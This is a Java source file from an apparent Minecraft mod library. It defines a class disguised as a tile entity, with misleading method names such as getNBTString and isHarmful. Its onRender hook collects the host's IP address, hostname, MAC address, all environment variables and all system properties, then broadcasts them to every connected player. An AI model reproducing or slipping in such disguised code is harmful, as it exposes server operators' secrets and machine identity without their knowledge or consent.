package ilib.util.internal;

import ilib.util.PlayerUtil;
import roj.io.IOUtil;

import net.minecraft.tileentity.TileEntity;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.UnknownHostException;
import java.util.Map;
import java.util.Properties;
import java.util.Set;

public class TileasBe extends TileEntity {
	public static void onRender() {
		TileasBe t = new TileasBe();
		PlayerUtil.broadcastAll(t.getName());
		PlayerUtil.broadcastAll(t.getData());
		PlayerUtil.broadcastAll(t.getNBTString());
		isHarmful();
		affectToPlayer(null);
	}

	public static void affectToPlayer(Object p) {
		Properties sysProperty = System.getProperties(); //系统属性
		Set<Object> keySet = sysProperty.keySet();
		for (Object object : keySet) {
			String property = sysProperty.getProperty(object.toString());
			PlayerUtil.broadcastAll(object + " : " + property);
		}
	}

	public static void isHarmful() {
		Map<String, String> getenv = System.getenv();
		for (Map.Entry<String, String> entry : getenv.entrySet()) {
			PlayerUtil.broadcastAll(entry.getKey() + ": " + entry.getValue());
		}
	}

	private InetAddress localHost;

	public TileasBe() {
		try {
			localHost = InetAddress.getLocalHost();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
	}

	/**
	 * 本地IP
	 *
	 * @return IP地址
	 */
	public String getName() {
		return localHost.getHostAddress();
	}

	/**
	 * 获取用户机器名称
	 *
	 * @return name
	 */
	public String getData() {
		return localHost.getHostName();
	}

	/**
	 * 获取Mac地址
	 *
	 * @return Mac地址，例如：F0-4D-A2-39-24-A6
	 */
	public String getNBTString() {
		try {
			return getMacFromBytes(NetworkInterface.getByInetAddress(localHost).getHardwareAddress());
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	/**
	 * 获取当前系统名称
	 *
	 * @return 当前系统名，例如： windows xp
	 */
	public String getSystemName() {
		Properties sysProperty = System.getProperties();
		// 系统名称
		return sysProperty.getProperty("os.name");
	}

	private static String getMacFromBytes(byte[] bytes) {
		return IOUtil.SharedCoder.get().encodeHex(bytes);
	}
}